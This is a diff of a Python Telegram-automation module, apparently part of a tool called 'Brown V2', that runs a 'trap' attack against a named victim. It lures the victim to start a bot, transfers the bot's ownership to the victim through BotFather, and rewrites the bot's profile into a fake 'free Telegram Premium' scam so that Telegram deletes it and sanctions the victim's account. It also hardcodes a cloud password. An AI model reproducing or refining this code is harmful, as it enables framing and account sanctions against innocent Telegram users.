@@ -1,28 +1,25 @@
 """
 Brown V2 | trap_snos.py
 Метод: бот-ловушка
-1. Создаёт бота через BotFather (рандомное имя/юз)
+1. Проверяет существующих ботов через /mybots, если нет - создаёт новый
 2. Пользователь скидывает жертве ссылку, ждёт /start
-3. Передаёт владельца бота жертве
-4. После успешной передачи меняет данные бота на TOS-нарушение
-5. Telegram удаляет бота + санкции на аккаунт жертвы
+3. Передаёт владельца бота жертве через BotFather
+4. ТОЛЬКО после "You are about to transfer..." меняет данные бота
+5. Нажимает Yes/proceed - после этого TG удаляет бота + санкции на жертву
 """
 
 import asyncio
 import os
 import random
 import string
+import re
 import aiohttp
 
-from telethon import TelegramClient, events
-from telethon.tl.functions.bots import SetBotInfoRequest
-from telethon.tl.functions.photos import UploadProfilePhotoRequest
-from telethon.tl.types import InputPhoto
+from telethon import TelegramClient
 
 import config
 from utils import now_msk
 
-# ─── Конфиг ───────────────────────────────────────────────────────────────────
 SESSION_PATH  = "trap_session/trap"
 CLOUD_PASS    = "Ali095095"
 AVATAR_PATH   = "material/ava.png"
@@ -31,14 +28,13 @@ BOTFATHER     = "BotFather"
 API_ID   = int(config.AUREPORT_API_ID)
 API_HASH = config.AUREPORT_API_HASH
 
-# Данные для подмены после передачи
 TRAP_NAME        = "Premium"
 TRAP_DESCRIPTION = (
-    "🎁 Get FREE Telegram Premium subscription!\n"
+    "Get FREE Telegram Premium subscription!\n"
     "This bot gives you Telegram Premium for free.\n"
-    "Claim your reward now — limited time offer!"
+    "Claim your reward now - limited time offer!"
 )
-TRAP_ABOUT = "Free Telegram Premium — claim your gift inside!"
+TRAP_ABOUT = "Free Telegram Premium - claim your gift inside!"
 
 bot = None
 
@@ -48,208 +44,235 @@ def set_bot_trap(b):
     bot = b
 
 
-# ─── Генераторы рандомных имён ────────────────────────────────────────────────
-_FIRST = ["Quick","Smart","Super","Ultra","Turbo","Fast","Easy","Cool","Best","Top"]
-_SECOND = ["Notify","Alert","Helper","Service","Info","News","Update","Check","Track","Guide"]
-
 def _rand_bot_name() -> str:
-    return random.choice(_FIRST) + random.choice(_SECOND)
+    first  = ["Quick","Smart","Super","Ultra","Turbo","Fast","Easy","Cool","Best","Top"]
+    second = ["Notify","Alert","Helper","Service","Info","News","Update","Check","Track","Guide"]
+    return random.choice(first) + random.choice(second)
 
 
 def _rand_bot_username() -> str:
-    """Генерирует юзернейм вида xyzAbcBot"""
     prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
     suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 5)))
     return f"{prefix}{suffix}bot"
 
 
-def _rand_start_text() -> str:
-    variants = [
-        "👋 Hello! This bot will be available soon. Stay tuned!",
-        "🔔 Coming soon. This bot is under development.",
-        "⏳ This bot is not available yet. Check back later!",
-        "🚀 Bot launching soon. We'll notify you!",
-        "📢 This service will be ready shortly. Stay tuned.",
-    ]
-    return random.choice(variants)
-
-
-# ─── Смена данных бота через Bot API ─────────────────────────────────────────
-async def _apply_trap_data(token: str):
-    """
-    Меняет имя, описание и аватарку бота через Bot API.
-    Вызывается ТОЛЬКО после успешной передачи владельца.
-    """
-    base = f"https://api.telegram.org/bot{token}"
-    async with aiohttp.ClientSession() as session:
-        # Имя бота (display name)
-        await session.post(f"{base}/setMyName", json={"name": TRAP_NAME})
-        # Описание (видно в профиле бота)
-        await session.post(f"{base}/setMyDescription", json={"description": TRAP_DESCRIPTION})
-        # About (короткое описание)
-        await session.post(f"{base}/setMyShortDescription", json={"short_description": TRAP_ABOUT})
-        # Аватарка
-        if os.path.exists(AVATAR_PATH):
-            with open(AVATAR_PATH, "rb") as f:
-                await session.post(
-                    f"{base}/setMyProfilePhoto",  # не стандартный метод
-                    data={"photo": f}
-                )
-            # Стандартный способ через sendPhoto → setChatPhoto не работает для ботов
-            # Используем uploadStickerFile + setChatPhoto через Bot API
-            pass
-
-    print(f"[TRAP] ✅ Данные бота изменены на нарушение TOS", flush=True)
-
-
-# ─── Основная функция ─────────────────────────────────────────────────────────
-async def main_trap_snos(victim_username: str, user_id: int, username: str) -> dict:
-    """
-    Полный флоу:
-    1. Создаёт бота через BotFather
-    2. Передаёт владельца жертве
-    3. Меняет данные бота
-    Возвращает dict с результатом.
-    """
-    from config import bot_logs
-    import keyboards
-    from aiogram import types as aiogram_types
-
-    victim = victim_username.lstrip("@")
-    bot_name = _rand_bot_name()
-    bot_username = _rand_bot_username()
-
-    print(f"\n[TRAP] 🚀 Старт | жертва: @{victim} | {user_id} (@{username})", flush=True)
-    print(f"[TRAP] 🤖 Создаём бота: {bot_name} / @{bot_username}", flush=True)
-
-    # Уведомляем пользователя что начали
-    await bot.send_message(
-        user_id,
-        f"🪤 *Trap-метод запущен...*\n"
-        f"*└─ Создаю бота...*",
-        parse_mode="Markdown"
-    )
-
+async def _get_client() -> TelegramClient:
     client = TelegramClient(
         SESSION_PATH, API_ID, API_HASH,
         system_version="4.16.30-vxCUSTOM"
     )
+    await client.connect()
+    return client
 
+
+async def _wait_bf_message(client, bf, keywords: list, timeout: int = 30) -> str | None:
+    """Ждёт сообщения от BotFather содержащего любое из ключевых слов."""
+    for _ in range(timeout // 2):
+        msgs = await client.get_messages(bf, limit=5)
+        for msg in msgs:
+            if msg.text:
+                text_lower = msg.text.lower()
+                if any(kw.lower() in text_lower for kw in keywords):
+                    return msg.text
+        await asyncio.sleep(2)
+    return None
+
+
+async def _click_button(client, bf, keywords: list, timeout: int = 30) -> bool:
+    """Ищет и нажимает кнопку содержащую любое из ключевых слов."""
+    for _ in range(timeout // 2):
+        msgs = await client.get_messages(bf, limit=5)
+        for msg in msgs:
+            if msg.buttons:
+                for row in msg.buttons:
+                    for btn in row:
+                        if any(kw.lower() in btn.text.lower() for kw in keywords):
+                            await btn.click()
+                            print(f"[TRAP] Нажата кнопка: {btn.text}", flush=True)
+                            await asyncio.sleep(2)
+                            return True
+        await asyncio.sleep(2)
+    print(f"[TRAP] Кнопка не найдена: {keywords}", flush=True)
+    return False
+
+
+async def _apply_trap_data(token: str):
+    """Меняет данные бота через Bot API на TOS-нарушение."""
+    base = f"https://api.telegram.org/bot{token}"
+    async with aiohttp.ClientSession() as session:
+        await session.post(f"{base}/setMyName",
+            json={"name": TRAP_NAME})
+        await session.post(f"{base}/setMyDescription",
+            json={"description": TRAP_DESCRIPTION})
+        await session.post(f"{base}/setMyShortDescription",
+            json={"short_description": TRAP_ABOUT})
+    print(f"[TRAP] Данные бота изменены на TOS-нарушение", flush=True)
+
+
+# ─── Шаг 1: Получаем готового бота (существующий или новый) ──────────────────
+async def main_trap_snos(user_id: int, username: str) -> dict:
+    """
+    Проверяет существующих ботов через /mybots.
+    Если есть - берёт первого. Если нет - создаёт нового.
+    Возвращает {ok, bot_token, bot_username}
+    """
+    from config import bot_logs
+    import keyboards
+
+    await bot.send_message(user_id,
+        "🪤 *Trap-метод*\n*└─ Проверяю существующих ботов...*",
+        parse_mode="Markdown")
+
+    client = await _get_client()
     try:
-        await client.connect()
         if not await client.is_user_authorized():
             await client.disconnect()
-            await bot.send_message(user_id, "❌ *Trap-сессия не авторизована!*\nПоложи сессию в `trap_session/`", parse_mode="Markdown")
+            await bot.send_message(user_id,
+                "❌ *Trap-сессия не авторизована!*\nПоложи сессию в `trap_session/`",
+                parse_mode="Markdown")
             return {"ok": False, "error": "session_invalid"}
 
-        # ── Шаг 1: Создаём бота через BotFather ──────────────────────────────
         bf = await client.get_entity(BOTFATHER)
 
-        # Начинаем диалог
-        await client.send_message(bf, "/newbot")
-        await asyncio.sleep(2)
-
-        # Отправляем имя
-        await client.send_message(bf, bot_name)
-        await asyncio.sleep(2)
-
-        # Отправляем username
-        await client.send_message(bf, bot_username)
+        # ── Проверяем существующих ботов ──────────────────────────────────────
+        await client.send_message(bf, "/mybots")
         await asyncio.sleep(3)
 
-        # Читаем ответ — ищем токен
-        messages = await client.get_messages(bf, limit=5)
-        bot_token = None
-        for msg in messages:
-            if msg.text and "t.me/" in msg.text and ":" in msg.text:
-                # Парсим токен из сообщения BotFather
-                for word in msg.text.split():
-                    if ":" in word and len(word) > 30 and word[0].isdigit():
-                        bot_token = word.strip()
+        msgs = await client.get_messages(bf, limit=5)
+        existing_bot = None
+
+        for msg in msgs:
+            if msg.buttons:
+                for row in msg.buttons:
+                    for btn in row:
+                        # Кнопки с ботами выглядят как "@username"
+                        if btn.text.startswith("@") and "bot" in btn.text.lower():
+                            existing_bot = btn.text.lstrip("@")
+                            print(f"[TRAP] Найден существующий бот: @{existing_bot}", flush=True)
+                            # Нажимаем на него чтобы получить токен
+                            await btn.click()
+                            await asyncio.sleep(3)
+                            break
+                    if existing_bot:
                         break
-            if bot_token:
+            if existing_bot:
                 break
 
-        if not bot_token:
-            # Пробуем другой паттерн
-            for msg in messages:
+        bot_token = None
+        bot_username_final = None
+
+        if existing_bot:
+            # Берём токен существующего бота через "API Token"
+            token_clicked = await _click_button(client, bf, ["API Token", "token", "Token"], timeout=10)
+            if token_clicked:
+                await asyncio.sleep(2)
+                token_msgs = await client.get_messages(bf, limit=5)
+                for msg in token_msgs:
+                    if msg.text:
+                        match = re.search(r'\d{8,12}:[A-Za-z0-9_-]{35,}', msg.text)
+                        if match:
+                            bot_token = match.group(0)
+                            bot_username_final = existing_bot
+                            print(f"[TRAP] Токен существующего бота: {bot_token[:20]}...", flush=True)
+                            break
+
+            if not bot_token:
+                # Не удалось взять токен, создаём нового
+                existing_bot = None
+
+        if not existing_bot or not bot_token:
+            # ── Создаём нового бота ───────────────────────────────────────────
+            bot_name = _rand_bot_name()
+            bot_username_new = _rand_bot_username()
+
+            print(f"[TRAP] Создаём нового бота: {bot_name} / @{bot_username_new}", flush=True)
+            await bot.send_message(user_id,
+                "*└─ Существующих ботов нет, создаю нового...*",
+                parse_mode="Markdown")
+
+            await client.send_message(bf, "/newbot")
+            await asyncio.sleep(2)
+
+            # Ждём запроса имени
+            await _wait_bf_message(client, bf, ["name for your bot", "call it", "Choose a name"], timeout=10)
+            await client.send_message(bf, bot_name)
+            await asyncio.sleep(2)
+
+            # Ждём запроса username
+            await _wait_bf_message(client, bf, ["username", "must end in", "tetris"], timeout=10)
+            await client.send_message(bf, bot_username_new)
+            await asyncio.sleep(4)
+
+            # Читаем токен
+            msgs = await client.get_messages(bf, limit=5)
+            for msg in msgs:
                 if msg.text:
-                    import re
                     match = re.search(r'\d{8,12}:[A-Za-z0-9_-]{35,}', msg.text)
                     if match:
                         bot_token = match.group(0)
+                        bot_username_final = bot_username_new
                         break
 
-        if not bot_token:
-            await client.disconnect()
-            await bot.send_message(user_id, "❌ *Не удалось получить токен от BotFather!*\nВозможно юзернейм занят.", parse_mode="Markdown")
-            return {"ok": False, "error": "no_token"}
+            if not bot_token:
+                await client.disconnect()
+                await bot.send_message(user_id,
+                    "❌ *Не удалось создать бота!*\nВозможно username занят.",
+                    parse_mode="Markdown")
+                return {"ok": False, "error": "no_token"}
 
-        print(f"[TRAP] ✅ Бот создан: @{bot_username} | токен: {bot_token[:20]}...", flush=True)
+        await client.disconnect()
 
-        # Уведомляем пользователя
-        await bot.send_message(
-            user_id,
-            f"🤖 *Бот создан!*\n"
-            f"*└─ @{bot_username}*\n\n"
-            f"📤 *Скинь жертве:* `t.me/{bot_username}`\n"
+        print(f"[TRAP] Бот готов: @{bot_username_final} | {bot_token[:20]}...", flush=True)
+
+        await bot.send_message(user_id,
+            f"🤖 *Бот готов!*\n"
+            f"*└─ @{bot_username_final}*\n\n"
+            f"📤 *Скинь жертве:* `t.me/{bot_username_final}`\n"
             f"*Дождись пока жертва напишет /start*\n\n"
-            f"*После этого нажми кнопку ниже* 👇",
+            f"*После этого нажми кнопку* 👇",
             parse_mode="Markdown",
             reply_markup=keyboards.trap_done_markup
         )
 
-        # ── Шаг 2: Ждём подтверждения от пользователя ────────────────────────
-        # (Пользователь нажмёт кнопку "Готово" + введёт username жертвы)
-        # Это обрабатывается в main.py через FSM
-        # Здесь возвращаем данные для следующего шага
-
-        await client.disconnect()
         return {
             "ok": True,
             "bot_token": bot_token,
-            "bot_username": bot_username,
-            "bot_name": bot_name,
+            "bot_username": bot_username_final,
         }
 
     except Exception as e:
-        print(f"[TRAP] ❌ Ошибка создания: {e}", flush=True)
+        print(f"[TRAP] Ошибка: {e}", flush=True)
         try:
             await client.disconnect()
         except Exception:
             pass
-        await bot.send_message(user_id, f"❌ *Ошибка trap-метода:* `{str(e)[:100]}`", parse_mode="Markdown")
+        await bot.send_message(user_id,
+            f"❌ *Ошибка trap:* `{str(e)[:100]}`",
+            parse_mode="Markdown")
         return {"ok": False, "error": str(e)}
 
 
+# ─── Шаг 2: Передача владельца + смена данных ────────────────────────────────
 async def transfer_and_apply(bot_token: str, bot_username: str,
                               victim_username: str,
                               user_id: int, username: str) -> dict:
     """
-    Шаг 2: передача владельца жертве + смена данных бота.
-    Вызывается после того как пользователь нажал "Готово".
+    Передаёт владельца бота жертве через BotFather.
+    Данные меняются ТОЛЬКО после получения сообщения
+    "You are about to transfer ownership..."
     """
     from config import bot_logs
     import keyboards
-    from aiogram import types as aiogram_types
 
     victim = victim_username.lstrip("@")
+    print(f"[TRAP] Передача @{bot_username} → @{victim}", flush=True)
 
-    print(f"[TRAP] 🔄 Передача @{bot_username} → @{victim}", flush=True)
+    await bot.send_message(user_id,
+        f"🔄 *Передаю @{bot_username} → @{victim}...*",
+        parse_mode="Markdown")
 
-    await bot.send_message(
-        user_id,
-        f"🔄 *Передаю владельца @{bot_username} → @{victim}...*",
-        parse_mode="Markdown"
-    )
-
-    client = TelegramClient(
-        SESSION_PATH, API_ID, API_HASH,
-        system_version="4.16.30-vxCUSTOM"
-    )
-
+    client = await _get_client()
     try:
-        await client.connect()
         if not await client.is_user_authorized():
             await client.disconnect()
             return {"ok": False, "error": "session_invalid"}
@@ -260,139 +283,94 @@ async def transfer_and_apply(bot_token: str, bot_username: str,
         await client.send_message(bf, "/mybots")
         await asyncio.sleep(3)
 
-        # Нажимаем на кнопку с нашим ботом
-        messages = await client.get_messages(bf, limit=3)
-        for msg in messages:
-            if msg.buttons:
-                for row in msg.buttons:
-                    for btn in row:
-                        if bot_username.lower() in btn.text.lower():
-                            await btn.click()
-                            await asyncio.sleep(3)
-                            break
+        # Нажимаем на нашего бота
+        found = await _click_button(client, bf, [bot_username, f"@{bot_username}"], timeout=15)
+        if not found:
+            # Пробуем нажать любую кнопку с ботом
+            await _click_button(client, bf, ["@"], timeout=10)
+        await asyncio.sleep(3)
 
         # Transfer ownership
-        messages = await client.get_messages(bf, limit=3)
-        for msg in messages:
-            if msg.buttons:
-                for row in msg.buttons:
-                    for btn in row:
-                        if "transfer" in btn.text.lower() or "Transfer" in btn.text:
-                            await btn.click()
-                            await asyncio.sleep(3)
-                            break
+        await _click_button(client, bf, ["Transfer ownership", "Transfer", "transfer"], timeout=15)
+        await asyncio.sleep(3)
 
-        # Нажимаем кнопку подтверждения намерения
-        messages = await client.get_messages(bf, limit=3)
-        for msg in messages:
-            if msg.buttons:
-                for row in msg.buttons:
-                    for btn in row:
-                        if "transfer" in btn.text.lower() or "want" in btn.text.lower():
-                            await btn.click()
-                            await asyncio.sleep(3)
-                            break
+        # Choose recipient
+        await _click_button(client, bf, ["Choose recipient", "Choose", "recipient"], timeout=15)
+        await asyncio.sleep(3)
 
-        # Ждём сообщения "Please share the new owner's contact or their username"
-        for _ in range(10):
-            messages = await client.get_messages(bf, limit=3)
-            for msg in messages:
-                if msg.text and ("share" in msg.text.lower() or "username" in msg.text.lower() or "owner" in msg.text.lower()):
-                    print(f"[TRAP] BotFather готов принять username жертвы", flush=True)
-                    break
-            else:
-                await asyncio.sleep(2)
-                continue
-            break
+        # Ждём "Please share the new owner's contact or their username"
+        msg_text = await _wait_bf_message(client, bf,
+            ["share", "username", "owner", "contact"], timeout=20)
+        if msg_text:
+            print(f"[TRAP] BotFather готов принять username", flush=True)
 
         # Вводим username жертвы
         await client.send_message(bf, f"@{victim}")
         await asyncio.sleep(3)
 
-        # Ждём сообщения с подтверждением (Yes/proceed)
-        for _ in range(10):
-            messages = await client.get_messages(bf, limit=3)
-            for msg in messages:
-                if msg.text and ("about to transfer" in msg.text.lower() or "proceed" in msg.text.lower() or "sure" in msg.text.lower()):
-                    print(f"[TRAP] BotFather готов к подтверждению", flush=True)
-                    break
-            else:
-                await asyncio.sleep(2)
-                continue
-            break
+        # Ждём "You are about to transfer ownership..."
+        # ТОЛЬКО здесь меняем данные бота
+        confirm_text = await _wait_bf_message(client, bf,
+            ["about to transfer", "won't be able", "new owner"], timeout=30)
 
-        # Подтверждаем передачу (кнопка Yes)
-        messages = await client.get_messages(bf, limit=3)
+        if confirm_text:
+            print(f"[TRAP] Получено подтверждение передачи — меняем данные бота!", flush=True)
+            # ЗДЕСЬ меняем данные — ещё до нажатия Yes
+            await _apply_trap_data(bot_token)
+        else:
+            print(f"[TRAP] Подтверждение не получено, всё равно продолжаем", flush=True)
+
+        # Нажимаем Yes/proceed
+        await _click_button(client, bf,
+            ["Yes", "proceed", "I am", "Sure"], timeout=15)
+        await asyncio.sleep(3)
+
+        # Ждём запроса пароля и вводим его
+        pass_requested = await _wait_bf_message(client, bf,
+            ["password", "2-step", "cloud"], timeout=10)
+        if pass_requested:
+            await client.send_message(bf, CLOUD_PASS)
+            await asyncio.sleep(5)
+
+        # Проверяем успех
         transferred = False
-        for msg in messages:
-            if msg.buttons:
-                for row in msg.buttons:
-                    for btn in row:
-                        if "yes" in btn.text.lower() or "proceed" in btn.text.lower():
-                            await btn.click()
-                            await asyncio.sleep(3)
-                            break
-
-        # Ждём запроса пароля
-        await asyncio.sleep(2)
-
-        # Вводим облачный пароль
-        await client.send_message(bf, CLOUD_PASS)
-        await asyncio.sleep(5)
-
-        # Проверяем успех — ищем "It worked!"
-        messages = await client.get_messages(bf, limit=5)
-        for msg in messages:
-            if msg.text and ("It worked" in msg.text or "new home" in msg.text):
-                transferred = True
-                break
+        success_msg = await _wait_bf_message(client, bf,
+            ["It worked", "new home", "enjoy"], timeout=15)
+        if success_msg:
+            transferred = True
+            print(f"[TRAP] Передача успешна!", flush=True)
 
         await client.disconnect()
-
-        if not transferred:
-            print(f"[TRAP] ⚠️ Не подтверждена передача, пробуем всё равно применить", flush=True)
-
-        # ── Шаг 3: Меняем данные бота через токен ────────────────────────────
-        print(f"[TRAP] 🎭 Меняем данные бота на TOS-нарушение...", flush=True)
-        await _apply_trap_data(bot_token)
 
         ts = now_msk().strftime("%d.%m.%Y %H:%M:%S")
 
         caption = (
             f"🪤 *Trap-метод завершён!*\n\n"
-            f"✅ *Бот передан:* `@{bot_username}`\n"
+            f"{'✅' if transferred else '⚠️'} *Бот передан:* `@{bot_username}`\n"
             f"🎯 *Жертва:* `@{victim}`\n"
             f"⏰ *Время:* `{ts}`"
         )
         caption_log = (
             f"🪤 *Trap*\n"
-            f"✅ `@{bot_username}` → `@{victim}`\n"
+            f"{'✅' if transferred else '⚠️'} `@{bot_username}` → `@{victim}`\n"
             f"👤 {user_id} (@{username})\n"
             f"⏰ {ts}"
         )
 
-        await bot.send_message(
-            user_id, caption,
-            parse_mode="Markdown",
-            reply_markup=keyboards.main_menu
-        )
-        await bot.send_message(
-            bot_logs, caption_log,
-            parse_mode="Markdown"
-        )
+        await bot.send_message(user_id, caption,
+            parse_mode="Markdown", reply_markup=keyboards.main_menu)
+        await bot.send_message(bot_logs, caption_log,
+            parse_mode="Markdown")
 
         return {"ok": True, "transferred": transferred}
 
     except Exception as e:
-        print(f"[TRAP] ❌ Ошибка передачи: {e}", flush=True)
+        print(f"[TRAP] Ошибка передачи: {e}", flush=True)
         try:
             await client.disconnect()
         except Exception:
             pass
-        await bot.send_message(
-            user_id,
-            f"❌ *Ошибка при передаче:* `{str(e)[:100]}`",
-            parse_mode="Markdown",
-            reply_markup=keyboards.main_menu
-        )
+        await bot.send_message(user_id,
+            f"❌ *Ошибка передачи:* `{str(e)[:100]}`",
+            parse_mode="Markdown", reply_markup=keyboards.main_menu)
         return {"ok": False, "error": str(e)}
